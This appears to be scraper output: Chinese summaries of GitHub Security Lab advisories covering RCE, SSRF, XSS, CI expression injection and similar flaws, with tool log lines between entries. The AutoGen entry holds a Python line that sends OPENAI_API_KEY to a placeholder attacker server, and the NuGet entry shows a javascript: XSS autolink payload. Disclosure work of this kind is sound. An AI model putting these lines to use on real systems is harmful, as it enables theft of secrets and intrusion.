+## 技术背景
+- **软件版本**: ngrinder v3.5.9
+- **漏洞描述**: 
+  - 该接口允许用户控制的 YAML 数据被直接传递到受影响的 `YamlReader#read` 方法。
+  - 用户通过未经身份验证的 `validateGithubConfig` 接口提交 YAML 数据。
+
+## 漏洞机制
+1. 用户的数据流入 `GitHubFileEntryService` 类的 `validate` 方法。
+2. `validate` 方法进一步调用 `getAllGithubConfig`，最终到达 `YamlReader#read`。
+
+## 风险
+- **代码执行**: 攻击者可以利用该漏洞执行恶意代码。因为 YamlBeans 允许根据用户控制的类名实例化类并使用公共字段或 setter 来填充对象。
+- 理论上，如果攻击者知道某个“gadget chain”，可能会找到合适的类在 ngrinder 的运行环境中引发远程代码执行。
+  
+### 示例
+如果 ngrinder 使用了 c3p0 库，攻击者可能会使用 `WrapperConnectionPoolDataSource` 类来执行代码。例如，可以构造一个请求使 YamlBeans 实例化该类并调用其 setter 方法。
+
+## 联系信息
+该漏洞由安全实验室团队成员 @p-（Peter Stöckli）发现并报告。如需更多信息，请联系 GHSL 团队：securitylab@github.com，并在通信中提及 GHSL-2024-069。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2024_069_不安全的_YAML_反序列化漏洞在_ngrinder_中_31e8965c.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-069_ngrinder/
+# GHSL-2024-070: 在Chromium中存在远程代码执行漏洞 - CVE-2024-3833
+
+在受影响的Chrome版本中，访问恶意网站可能会导致对象损坏，攻击者可以利用这一点在Chrome的渲染器中执行恶意代码。
+
+### 受影响的Chromium版本
+- **Chromium版本**: 123.0.6312.58
+
+### 技术细节
+1. **InstallConditionalFeatures**: 该功能会检查WebAssembly对象中是否存在Function属性，以防止对象中添加重复属性。
+2. **InstallTypeReflection**: 该功能同样为其他对象添加属性，但没有进行重复性检查。这意味着：
+   - 比如在`wasm_table_constructor`的原型中添加`type`属性时，没有检查该属性是否已存在。
+   - 这导致了对象中出现重复属性的问题（例如：问题编号40056206）。
+
+### 漏洞利用
+攻击者可以利用上述问题，在Chrome的渲染器中获得远程代码执行权限（RCE）。
+
+### 报告信息
+该漏洞是由GHSL团队的成员@ m-y-mo（Man Yue Mo）发现和报告的。若需联系GHSL团队，请发送邮件至securitylab@github.com，并在通信中提及GHSL-2024-070。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2024_070_在Chromium中存在远程代码执行漏洞_CVE_2024_383_efc037ec.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-070_Chromium/
+# GHSL-2024-001_GHSL-2024-003: RubyGems.org 远程拒绝服务（DoS）和潜在的身份验证绕过 - CVE-2024-35221
+
+## 概述
+
+在RubyGems.org发现了远程拒绝服务（DoS）漏洞，以及潜在的身份验证绕过。这些问题影响了Ruby社区的gem托管服务。
+
+**注意**：经过确认，潜在的身份验证绕过（GHSL-2024-002和GHSL-2024-003）在RubyGems.org的生产环境中无法被利用。但为了防止未来的攻击，已经采取了强化措施。
+
+## 漏洞详情
+
+### 1. 远程拒绝服务（DoS）
+
+- **原因**：Gem 发布者在发布 gem 时可能导致远程 DoS。Ruby 通过 `Gem::Specification.from_yaml` 读取 gem 文件的清单，`from_yaml` 使用 `SafeYAML.load` 处理 YAML 文件。YAML 文件中的别名可能导致所谓的“YAML-bombs”攻击，类似于“亿笑”攻击。
+  
+- **影响**：如果攻击者使用包含YAML-bombs 的多个 gem，可能导致整个 RubyGems.org 无法响应。
+
+- **例子**：成功的攻击需要发送多个请求，系统会被阻断。如果所有工作进程都忙，RubyGems Rails 应用将无法响应。
+
+### 2. 身份验证绕过
+
+- **问题描述**：RubyGems 的可信发布者控制器在某些稀有情况下会接受使用“none”算法的JWT，这可能允许攻击者用伪造的令牌替换有效的API密钥。
+
+- **流程**：
+  1. JWT被提供后被解码，但不进行验证。
+  2. 从数据库查询JWT的发行者。
+  3. 然后用JWKS（JSON Web Key Set）验证签名。
+
+- **漏洞**：在某些情况下，如果JWKS为空，则可能允许伪造的JWT通过，从而攻击者可能发布新版本的gem，尤其是在数据库未返回JWKS的情况下。
+
+### 3. API密钥角色控制器
+
+- **问题描述**： API密钥角色控制器也接受“none”算法的JWT。
+
+- **影响**：攻击者可以使用伪造的令牌交换有效API密钥，与RubyGems.org API通信，并可能发布或删除gem，或添加/删除拥有者，前提是相应的API密钥角色已经设置并且JWKS返回为null。
+
+- **流程**：JWT在`decode_jwt`方法中进行验证，存在类似的JWKS为空的漏洞。
+
+## 联系方式
+
+发现并报告这些问题的成员是GHSL团队的@p-（Peter Stöckli）。如有需要，请通过 securitylab@github.com 联系GHSL团队，并在相关通信中提及GHSL-2024-001、GHSL-2024-002或GHSL-2024-003。
+Folder 'DoS' already exists.
+DoS
+内容已保存至 DoS/GHSL_2024_001_GHSL_2024_003_RubyGems_org_远程拒绝服务_D_322263ff.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-001_GHSL-2024-003_rubygems_org/
+# GHSL-2023-257: 服务器端请求伪造 (SSRF) 漏洞在 Plane - CVE-2024-31461
+
+**日期：** 2024-03-11  
+**跟进邮件**：询问新的修复版本的发布日期。
+
+## 漏洞描述
+
+Plane v0.13-dev 存在一个认证盲服务器端请求伪造（SSRF）漏洞。
+
+### 漏洞细节
+
+- **受影响的文件**：`apiserver/plane/api/views/importer.py`
+- **相关类**：`ServiceIssueImportSummaryEndpoint`
+- **关键函数**：`get` 
+- **漏洞情况**：
+  - `get` 函数接受用户控制的 `cloud_hostname` GET 参数，并将其传递给 `jira_project_issue_summary` 函数。
+  - 在代码的多个地方（行 11, 16, 21, 26 和 36），该参数与 URL 不安全地拼接。
+  - 结果是，这些拼接后的 URL 被用来向任意目标发起 GET 请求，导致了盲 SSRF 漏洞。
+
+### 漏洞影响
+
+该漏洞可能导致信息泄露。攻击者可以利用服务器向任意地址发送 GET 请求。
+
+### 漏洞发现
+
+此问题是由 GHSL 团队成员 @sylwia-budzynska（Sylwia Budzynska）发现并报告的。
+
+### 联系方式
+
+如需联系 GHSL 团队，请发送邮件至 [securitylab@github.com](mailto:securitylab@github.com)，并在任何相关通信中提及 GHSL-2023-257。
+Folder 'SSRF' already exists.
+SSRF
+内容已保存至 SSRF/GHSL_2023_257_服务器端请求伪造_SSRF_漏洞在_Plane_CVE_202_43a12d45.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-257_makeplane_plane/
+# GHSL-2023-261: Owncast中的跨源请求漏洞（CVE-2024-29026）
+
+## 概述
+Owncast（版本0.1.2）存在一个跨源资源共享（CORS）政策宽松的问题，允许攻击者发起跨源请求并读取敏感信息，例如管理员密码。这可能导致帐户被接管。
+
+## 技术细节
+- **CORS（跨源资源共享）**：是一种允许或限制浏览器从不同源（域）加载资源的机制。
+- **漏洞描述**：Owncast的CORS处理程序会反射Origin头，这意味着如果攻击者提供一个包含恶意代码的网站，已经登录的管理员访问该网站时，攻击者可以窃取他们的密码。
+  
+## 攻击方式
+攻击者可以在他们的网站上托管以下HTML文件。当已登录的Owncast管理员访问这个网站时，管理员的密码会被盗取，并显示在浏览器的警告框中。
+
+## 报告与联系
+此问题由GHSL团队成员@Kwstubbs（Kevin Stubbings）发现和报告。如需更多信息，请联系GHSL团队，邮箱是securitylab@github.com，并在通信中提及GHSL-2023-261。
+
+Folder 'CSRF' created.
+CSRF
+内容已保存至 CSRF/GHSL_2023_261_Owncast中的跨源请求漏洞_CVE_2024_29026_9b462b4c.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-261_Owncast/
+# GHSL-2024-145: Discord.js中的操作表达式注入漏洞
+
+**概述**：Discord.js 存在一个漏洞，攻击者可以通过操作表达式注入影响到GitHub库，进而窃取机密信息。
+
+## 技术背景
+
+- **什么是Discord.js？**  
+  Discord.js 是一个用于与 Discord API 交互的JavaScript库。
+
+- **漏洞细节**：  
+  最新的提交表明，在 `chore/label-enhancements` 分支中的 `pr-triage.yml` 工作流会在创建拉取请求时被触发。
+  - 该工作流拥有完全写权限的GitHub库令牌，默认情况下，组织或库的工作流权限设置为可读写。
+  - 工作流将用户控制的拉取请求数据（例如拉取请求的标题）注入到一个运行步骤的脚本中。
+  
+- **攻击风险**：  
+  攻击者可以利用这个漏洞接管GitHub Runner，执行自定义命令和修改仓库。这可能导致：
+  - 窃取工作流中的机密信息。
+  - 修改仓库内容。
+
+- **发现与报告**：  
+  这个问题是由GHSL团队成员@pwntester（Alvaro Muñoz）发现并报告的。
+
+## 联系信息
+
+如果您有关于此问题的任何疑问，请联系GHSL团队，邮件地址为：securitylab@github.com，并在沟通中提及 GHSL-2024-145。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2024_145_Discord_js中的操作表达式注入漏洞_07f7dded.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-145_Discord_js/
+# GHSL-2020-029: Apache Syncope的服务器端模板注入漏洞（CVE-2020-1959）
+
+## 概述
+
+在Apache Syncope中发现了一个服务器端模板注入漏洞。攻击者可以通过这个漏洞注入任意的Java EL表达式，从而导致远程代码执行（RCE）。
+
+## 影响版本
+
+- Apache Syncope: 2.1.5
+
+## 漏洞详情
+
+通过注入Java表达式语言（EL）表达式，攻击者可以在服务器上以Syncope服务账户权限运行任意代码。
+
+- Apache Syncope使用Java Bean验证（JSR 380）的自定义约束验证器，例如`org.apache.syncope.core.persistence.jpa.validation.entity.AnyObjectValidator`。
+- 在构建自定义约束违例错误消息时，可以插入不同类型的文本，包括Java EL表达式。
+- 如果攻击者可以注入恶意数据到错误消息模板中，那么就可以执行任意Java代码。
+- 共有25个验证器使用了`ConstraintValidatorContext.buildConstraintViolationWithTemplate()`，其中有20个显然存在漏洞（将验证后的值反映在错误消息中）。
+
+## 风险
+
+此漏洞可能导致远程代码执行。
+
+## 修复建议
+
+有多种方法可以解决此问题，具体的修复方案已经在相关提交中实施。
+
+## 报告和联系
+
+此报告遵循GHSL协调披露政策。此漏洞由GHSL团队成员@pwntester（Alvaro Muñoz）发现并报告。
+
+如有疑问，请联系GHSL团队：securitylab@github.com，并在任何与该漏洞相关的通信中包含GHSL-2020-029。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2020_029_Apache_Syncope的服务器端模板注入漏洞_CVE_2020_8a8aee5e.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2020-029-apache-syncope/
+# GHSL-2024-051: Misskey中的GitHub Actions表达式注入漏洞
+
+## 概述
+Misskey存在一个安全漏洞，攻击者可以利用此漏洞接管代码库并窃取敏感信息。
+
+## 漏洞详情
+
+- **影响版本**: Misskey 2024.3.1
+- **工作流程触发**: 该漏洞利用了在创建Pull Request时触发的`storybook.yml`工作流程。
+- **权限问题**: 此工作流程使用的GitHub存储库令牌具有写权限，因为组织/存储库的默认权限设置为可读可写。
+
+## 漏洞利用
+1. 攻击者可以通过创建一个特定的Pull Request来注入数据（即分支名称 `${{ github.event.pull_request.head.ref }}`）。
+2. 注入的数据被用在工作流程的Run步骤中，使攻击者能够操控GitHub Runner 执行自定义命令。
+3. 这可能导致盗取工作流程中的秘密信息和修改代码库。
+
+## 联系方式
+此问题由GHSL团队成员@jorgectf (Jorge Rosillo)发现并报告。如有任何疑问，请联系GHSL团队：securitylab@github.com，并在沟通中引用GHSL-2024-051。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2024_051_Misskey中的GitHub_Actions表达式注入漏洞_4e3996d9.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-051_Misskey/
+# GHSL-2020-142: PNG Image Processing Vulnerability - CVE-2020-28248
+
+## 概述
+png-img 是一个用于处理 PNG 图像的库，它依赖于 libpng。这个库存在一个整数溢出漏洞，可能导致堆内存损坏。
+
+## 技术细节
+
+1. **漏洞来源**
+   - png-img 在处理 PNG 图像时，会调用 `PngImg::InitStorage` 函数来分配内存。
+   - 该函数尝试分配一个 `png_byte` 数组，其大小是 `info_.height` 和 `info_.rowbytes` 的乘积。
+
+2. **整数溢出**
+   - `info_.height` 和 `info_.rowbytes` 都是 32 位无符号整数。
+   - 如果 `info_.height` 的值非常大（例如 0x01000001），而 `info_.rowbytes` 的值较小（例如 0x100），计算结果会因为溢出变为一个小的值（0x100）。
+   - 这种情况下，分配的内存就不够，无法存储实际数据，导致数组访问越界。
+
+3. **内存损坏**
+   - 越界访问可能导致程序错误地写入临近的内存区域，攻击者可以控制这些写入的数据。
+   - 如果攻击者控制了数据，他们可以执行任意代码，导致安全问题。
+
+4. **libpng 版本问题**
+   - 当前 png-img 绑定的是 libpng 1.6.14，而最新版本是 1.6.37。
+   - 旧版本的 libpng 可能也存在其他已知的安全漏洞。
+
+## 建议
+- 建议用户立即更新到 libpng 的最新版本，以降低受到已知漏洞攻击的风险。
+
+## 联系方式
+- 本问题由 GHSL 团队成员 @anticomputer（Bas Alberts）发现和报告。
+- 如需进一步信息，请联系 GHSL 团队，邮箱：securitylab@github.com，同时在通信中提及 GHSL-2020-142。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2020_142_PNG_Image_Processing_Vulnerability_401febec.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2020-142-gemini-png-img/
+# GHSL-2023-009: LDAP认证中的凭证泄露问题 - CVE-2023-28857
+
+## 概述
+
+在Apereo CAS（一个单点登录解决方案）通过LDAP目录进行X509证书认证时，未认证的用户可以泄露LDAP的凭证。攻击者可以发送特制的X509客户端证书，利用证书中的“CRL Distribution Points”扩展获取指向恶意资源的URLs。
+
+## 技术背景
+
+- **Apereo CAS 版本**: v6.6.4
+- **X509证书认证**: Apereo CAS可以使用客户端X509证书进行认证，这些证书可以通过TLS握手或特殊的HTTP头（例如“ssl_client_cert”）提供。
+- **证书验证**: X509CredentialsAuthenticationHandler会检查提供的证书是否未被撤销（revoked）。这个检查是通过从证书中提取的“CRL Distribution Points”获取撤销URLs来实现。
+
+## 漏洞成因
+
+1. **恶意URLs**: 如果证书中包含恶意的CRL URL，CAS将访问这些URL。
+2. **密码泄露**: 在CAS配置使用LDAP进行X509认证时，CAS会使用初始配置的LDAP服务器密码进行请求。如果请求的LDAP URL是恶意的，则此密码可能会泄露。
+3. **签名有效性问题**: X509CredentialsAuthenticationHandler只检查证书的日期和撤销状态，而不检查证书的签名。因此，即使是未受信任的自签名证书也可被利用。
+
+## 配置示例
+
+可以从[cas-initializer](https://casinit.herokuapp.com/ui)下载CAS Overlay v6.6.4，包含必要的依赖项（cas-server-support-x509 和 cas-server-support-rest-x509），并按照下列命令构建：
+
+```bash
+./gradlew clean build
+mkdir /etc/cas
+./gradlew createKeystore
+./gradlew copyCasConfiguration
+```
+
+示例配置将CAS实例设置为使用位于`ldap://example.com:1389/`的LDAP服务器，并使用`admin`和`s3cr3taaaaa`凭证，同时启用LDAP的撤销检查。
+
+### 注意
+此示例配置只是便于测试，生产环境中的实际配置可能不同，但依然存在漏洞。
+
+## 风险
+
+- 任何未认证用户都可以泄露与服务器LDAP连接的密码。
+
+## 联系
+
+此问题由GHSL团队成员@artsploit（Michael Stepankin）发现并报告。如需进一步联系GHSL团队，请发邮件至securitylab@github.com，并在相关通信中提到GHSL-2023-009。
+Folder '信息泄露' already exists.
+信息泄露
+内容已保存至 信息泄露/GHSL_2023_009_LDAP认证中的凭证泄露问题_CVE_2023_28857_883fc140.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-009_Apereo_CAS/
+# GHSL-2024-025_GHSL-2024-026: GitHub Pull Request可能泄露API密钥
+
+## 概述
+
+在某些GitHub工作流中，当触发一个Pull Request时，可能会泄露秘密的API密钥（例如OpenAI、Azure、Bing等）。
+
+## 技术背景
+
+- **AutoGen版本**：v0.2.15
+- **漏洞来源**：
+  - 使用`pull_request_target`事件的工作流程会检出来自Pull Request的不可信代码并运行。
+  - 这种做法允许攻击者通过创建一个包含恶意脚本的Pull Request，来访问保存于环境变量中的秘密信息（如`OPENAI_API_KEY`、`AZURE_OPENAI_API_KEY`等）。
+
+## 漏洞细节
+
+1. **检出不可信代码**：当工作流运行时，它会检查并执行来自分叉的测试脚本，这种不可信的代码会在能够访问秘密的环境中运行。
+2. **访问秘密的示例**：攻击者可以创建恶意文件，如`test/test_qdrant_retrievechat.py`，以获取环境变量中的秘密。
+3. **其他受影响步骤**：除了RetrieveChatTest.Coverage步骤外，该工作流中的其他步骤也存在相同的漏洞。
+
+## 验证漏洞
+
+尽管工作流没有写权限（不能修改基础仓库），攻击者仍然可以通过以下方式获取环境中的密钥：
+
+```python
+import urllib.request
+import os
+
+urllib.request.urlopen(f"https://YOUR-CONTROLLED-SERVER?{os.environ['OPENAI_API_KEY']}")
+```
+
+## 发现和报告
+
+这一问题是由GHSL团队成员@pwntester（Alvaro Muñoz）发现并报告的。如需联系GHSL团队，请发送邮件至securitylab@github.com，并在邮件中包含GHSL-2024-025或GHSL-2024-026的参考信息以供后续沟通。
+Folder '信息泄露' already exists.
+信息泄露
+内容已保存至 信息泄露/GHSL_2024_025_GHSL_2024_026_GitHub_Pull_Request可能_a48b6e2e.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-025_GHSL-2024-026_AutoGen/
+# GHSL-2024-071: Chromium内存损坏漏洞 - CVE-2024-3832
+
+在受影响版本的Chrome浏览器中，访问恶意网站可能导致Chrome渲染器中的对象损坏。
+
+## 受影响的版本
+- Chromium版本：123.0.6312.58
+
+## 问题描述
+- 为了防止之前的问题（如CVE-2021-30561），引入了一些机制，但这些机制不够有效。
+- 在`InstallConditionalFeatures`中，引入了一项检查，确保WebAssembly对象在添加属性之前没有相关属性。
+
+## 技术细节
+1. **WebAssembly检查**：检查涉及全局WebAssembly对象（1和2），但在使用`InstallSuspenderConstructor`安装属性时，检查的是`context->wasm_webassembly_object()`（3），这可能与全局WebAssembly对象不相同。
+   
+2. **属性设置冲突**：
+   - 首先在WebAssembly对象上设置Suspender属性，然后将全局WebAssembly更改为其他对象。
+   - 这时，属性名称检查将针对新分配的WebAssembly对象进行，而属性将被添加到已有Suspender对象的`context->wasm_assembly_object()`中。
+
+3. **后果**：这会导致一个损坏的对象，出现重复的Suspender属性。
+
+4. **影响**：该问题也会影响`InstallTypeReflection`函数，当在函数中安装属性时可能出现问题。
+
+## 安全建议
+- 由于这个问题可能导致Chrome渲染器的内存损坏，建议用户尽快更新到修复版本的浏览器。
+
+## 举报信息
+- 此问题由GHSL团队成员@ m-y-mo（Man Yue Mo）发现并报告。
+- 如需进一步信息，请联系GHSL团队：securitylab@github.com，并在相关通信中提及GHSL-2024-071。
+Folder 'UAF' already exists.
+UAF
+内容已保存至 UAF/GHSL_2024_071_Chromium内存损坏漏洞_CVE_2024_3832_fd0de0c1.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-071_Chromium/
+# GHSL-2020-131: Mongo-express中的远程代码执行漏洞 - CVE-2020-24391
+
+## 背景
+
+mongo-express是一个MongoDB的Web管理工具。它使用`safer-eval`来验证用户提交的JavaScript代码，但这个验证方法存在漏洞，允许攻击者在Node.js服务器上下文中执行任意代码（RCE）。
+
+### 关键点
+
+- **受影响版本**：mongo-express v0.54.0
+- **漏洞类型**：远程代码执行（RCE）
+
+## 漏洞细节
+
+当用户提交JavaScript代码时，mongo-express会通过`safer-eval`进行验证。然而，由于该工具的沙箱机制可以被轻易绕过，攻击者能够执行未授权的命令。
+
+### 漏洞利用
+
+攻击者可以通过以下方式利用此漏洞：
+
+1. **需要用户认证**：必须有一个已登录的用户。
+2. **无意识的POST请求**：通过特制的负载，攻击者可以自动向`/checkValid`端点发送请求，并执行用户提交的代码。
+
+### 漏洞验证步骤
+
+1. 创建一个名为`index.html`的文件，内容包含特制的代码。
+2. 在相同目录启动一个Web服务器。
+3. 在浏览器中访问 `http://localhost/`，确保目标mongo-express服务器中有一个已登录用户，并且会话是在同一浏览器中启动的。
+4. 检查mongo-express的控制台，可以看到请求已成功发送，并且执行了系统命令。
+
+### 报告和联系
+
+该漏洞是由GHSL团队成员@agustingianni（Agustin Gianni）发现和报告的。如需联系GHSL团队，请发邮件至securitylab@github.com，并在邮件中包含GHSL-2020-131。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2020_131_Mongo_express中的远程代码执行漏洞_CVE_2020_aad0dd66.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2020-131-mongo-express/
+# GHSL-2024-040: Typebot.io 登录页面的跨站脚本漏洞 (XSS) - CVE-2024-30264
+
+## 概述
+在 typebot.io 的登录页面存在一个反射型跨站脚本漏洞 (XSS)，攻击者可以利用这个漏洞劫持用户账户。
+
+## 技术细节
+- **影响版本**: typebot.io v2.23.0
+- **漏洞原理**:
+  - 登录页面从 URL 中获取 `redirectPath` 参数。
+  - 如果用户点击了一个包含恶意 `redirectPath` 的链接，并且这个参数使用了 JavaScript 方案，攻击者可能会执行任意 JavaScript 代码，具有用户的权限。
+
+## 潜在风险
+这个漏洞可能导致账户被劫持。
+
+## 漏洞示例
+攻击者可以构造如下链接，从本地服务器下载并在受害者的域名下执行某个 JavaScript 文件。这个方法允许攻击者在不知情的情况下执行其代码。
+
+## 发现者
+该漏洞由 GHSL 团队成员 @Kwstubbs (Kevin Stubbings) 发现并报告。
+
+## 联系我们
+如需进一步信息，请联系 GHSL 团队，邮箱：securitylab@github.com，并在沟通中提及 GHSL-2024-040。
+Folder 'XSS' already exists.
+XSS
+内容已保存至 XSS/GHSL_2024_040_Typebot_io_登录页面的跨站脚本漏洞_XSS_CVE_a25eb057.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-040_typebot_io/
+# GHSL-2024-037: GitHub Actions表达式注入漏洞在BioDrop中
+
+## 基本信息
+- **项目名**: BioDrop
+- **版本**: v2.99.18
+
+## 漏洞概述
+BioDrop存在一个漏洞，允许攻击者通过**操作表达式注入**来操控代码库的问题（issues）。
+
+## 漏洞详细
+1. **触发条件**: 
+   - 当新问题被创建或已有问题被修改时，`check-author-issues.yml`工作流会被触发。
+  
+2. **权限**:
+   - 该工作流具有对问题的写入权限。
+
+3. **漏洞机制**:
+   - 工作流使用了来自问题的内容（${{ github.event.issue.body }}），并将其注入到脚本中。
+   - 这使得攻击者能控制GitHub Runner并执行自定义命令。
+
+4. **影响**:
+   - 攻击者可以随意修改问题内容。
+
+## 漏洞发现
+- 该漏洞是通过使用CodeQL工具的JavaScript表达式注入查询发现的。
+  
+## 联系方式
+- 此漏洞由GHSL团队成员@jorgectf（Jorge Rosillo）发现和报告。
+- 对于此漏洞的任何咨询，您可以联系GHSL团队，邮箱是securitylab@github.com，并请在邮件中引用GHSL-2024-037。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2024_037_GitHub_Actions表达式注入漏洞在BioDrop中_c889b75a.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-037_BioDrop/
+# GHSL-2020-228: YApi中的弱JSON Web Token (JWT) 签名秘密 - CVE-2021-27884
+
+## 问题概述
+YApi使用了不安全的随机数生成器来签名JWT，这可能导致安全隐患。
+
+## 技术背景
+- **JWT (JSON Web Token)**: 一种用于安全传输信息的令牌。
+- **伪随机数生成器**: 用于生成看似随机的字符串，但并不安全。
+
+## 问题细节
+- **随机字符串生成**: YApi使用`Math.random()`函数生成密码盐，这个过程并不安全。
+  - 生成的字符串大约10-12个字符长，仅包含数字和小写字母。
+  - 生成的字符串是可逆的，攻击者可以通过算法还原出密码盐。
+
+- **攻击方式**:
+  - 攻击者可以快速创建多个用户账户，获取JWT。
+  - 通过观察三个连续的JWT值，攻击者可以重建随机数生成器的内部状态。
+  - 这一攻击虽然在单台机器上耗时较长，但借助云计算，攻击成本大约在8,000到24,000美元之间。
+
+## 风险
+- 攻击者能够获取和重构用于签名的密码盐，可能伪造其他用户的JWT。
+- JWT的有效期为7天，不会限制攻击的窗口期。
+
+## 联系信息
+此问题由GHSL团队成员@JarLob发现。如需联系GHSL团队，请发送邮件至securitylab@github.com，并在邮件中提及GHSL-2020-228。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2020_228_YApi中的弱JSON_Web_Token_JWT_签名秘密_f7b864e2.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2020-228-YMFE-yapi/
+# GHSL-2024-044: GitHub Actions 表达式注入漏洞在 Simple Icons 中
+
+## 概述
+Simple Icons 存在一个 **表达式注入** 漏洞，这使得攻击者能够接管代码库并窃取机密信息。
+
+## 版本信息
+- **受影响版本**: Simple Icons v11.9.0
+
+## 漏洞原因
+- **工作流触发**: `autoclose-issues.yml` 工作流在创建新问题时被触发。
+- **权限设置**: 默认情况下，该工作流使用具有完全写入权限的 GitHub 令牌。这意味着它可以读写代码库。
+- **注入点**: 此工作流将由用户控制的问题标题（`${{ github.event.issue.title }}`）注入到执行步骤的脚本中。
+
+## 风险
+- **攻击者控制**: 攻击者可以利用此漏洞接管 GitHub Runner，执行自定义命令并更改代码库内容。
+- **秘密泄露**: 该漏洞可能导致工作流中机密信息的窃取和代码库的修改。
+
+## 发现与报告
+- 此漏洞是由 GHSL 团队成员 @jorgectf（Jorge Rosillo）发现并报告的。
+
+## 联系我们
+如需进一步信息，请联系 GHSL 团队: **securitylab@github.com**，并在通讯中提及 GHSL-2024-044。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2024_044_GitHub_Actions_表达式注入漏洞在_Simple_Icon_c5b257ca.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-044_Simple_Icons/
+# GHSL-2024-033: 服务器端请求伪造（SSRF）在 open-webui 中的漏洞 - CVE-2024-30256
+
+## 概述
+open-webui 存在一个经过身份验证的盲服务器端请求伪造漏洞。
+
+### 受影响版本
+- open-webui v0.1.111
+
+## 漏洞细节
+- **漏洞路径**: 下载接口
+- **影响**: 用户输入的 URL (通过 GET 参数) 被下载文件流功能使用，导致通过服务器发送 GET 请求，出现盲 SSRF 漏洞。
+
+## 漏洞影响
+该漏洞允许攻击者通过 open-webui 服务器发送请求，这可能会：
+- 探测其他潜在的服务器漏洞
+- 访问服务器内部网络上的其他后端系统
+
+## 发现与报告
+- **发现者**: GHSL 团队成员 @sylwia-budzynska（Sylwia Budzynska）
+- **工具**: 此漏洞是通过 CodeQL 查找的。
+
+## 联系方式
+如需更多信息，请通过以下邮件联系 GHSL 团队：securitylab@github.com，邮件中请提及 GHSL-2024-033。
+Folder 'SSRF' already exists.
+SSRF
+内容已保存至 SSRF/GHSL_2024_033_服务器端请求伪造_SSRF_在_open_webui_中的漏洞_C_c2c4c9b3.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-033_open-webui/
+# GHSL-2024-016: NuGet.org 的 Markdown 安全隐患 - CVE-2024-37304
+
+## 背景
+
+NuGetGallery 是 https://nuget.org/ 的核心，提供 .NET 包的公共源。NuGet 包的 Readme 文件使用 Markdown 格式编写，并转换为 HTML 显示。
+
+## 主要问题
+
+- **Markdown 渲染**：NuGetGallery 使用 markdig 库将 Markdown 转换为 HTML。
+- **安全措施**：它会过滤链接中的 JavaScript 代码，但对自动链接（autolinks）的过滤不够严格。
+
+## 具体问题
+
+### 自动链接的安全漏洞
+
+- 一些 Markdown，如 `<javascript:alert(1)>`，会被渲染为普通链接，而没有被适当地过滤。
+- 攻击者可以伪装链接文本，使受害者误点击，从而可能导致 XSS（跨站脚本攻击）。
+
+### 安全影响
+
+- 虽然 NuGetGallery 的 Cookies 设置了 `HttpOnly` 标志，但攻击者仍可以：
+  - 重定向用户到其他页面。
+  - 伪装页面内容或链接。
+  - 提取页面数据。
+
+## 发现与报告
+
+该问题由 GHSL 团队成员 @JarLob（Jaroslav Lobačevski）发现并报告。
+
+如需联系 GHSL 团队，请发送邮件至 securitylab@github.com，并在相关通信中引用 GHSL-2024-016。
+Folder 'XSS' already exists.
+XSS
+内容已保存至 XSS/GHSL_2024_016_NuGet_org_的_Markdown_安全隐患_CVE_202_816e230b.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-016_NuGetGallery/
+# GHSL-2024-010: Stable-diffusion-webui中的有限文件写入漏洞 - CVE-2024-31462
+
+## 漏洞概述
+
+Stable-diffusion-webui 1.7.0 在 Windows 系统上存在一个有限文件写入漏洞。
+
+## 技术细节
+
+- **影响版本**: Stable-diffusion-webui 1.7.0
+- **发现工具**: 此漏洞是通过 CodeQL 检测到的。
+
+### 漏洞来源
+
+1. **代码位置**: 问题出现在线 `modules/ui_extensions.py` 文件的 `create_ui` 方法（Backup/Restore选项卡）。
+2. **用户输入**: 用户输入被存储在 `config_save_name` 变量中。
+3. **文件路径创建**: 这个变量在 `save_config_state` 方法中用于生成文件路径。
+4. **文件写入**: 最终在一个特定的行被打开以进行写入，允许在服务器上的任何位置写入 json 文件。
+
+### 安全风险
+
+该漏洞允许攻击者在服务器上随意写入 json 文件。
+
+## 联系信息
+
+如果有关于此问题的任何疑问，请联系 GHSL 团队：securitylab@github.com，并在任何通信中引用 GHSL-2024-010。
+Folder '任意文件读写漏洞' already exists.
+任意文件读写漏洞
+内容已保存至 任意文件读写漏洞/GHSL_2024_010_Stable_diffusion_webui中的有限文件写入漏洞_42c83787.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-010_stable-diffusion-webui/
+# GHSL-2023-224: Arm Mali GPU Driver Memory Vulnerability - CVE-2023-6241
+
+## 简介
+在Arm Mali GPU驱动程序中，释放的 GPU 内存仍然可以被访问，导致安全漏洞。该问题被测试于 Pixel 8 设备，使用的是11月的安全补丁。
+
+## 技术细节
+
+- **影响配置**: 此漏洞存在于 `MALI_USE_CSF` 配置中。
+- **漏洞机制**: 
+  - 在分配即时编译（JIT）内存时，如果重用了之前释放的内存，就会调用 `kbase_jit_grow` 函数来扩展内存。
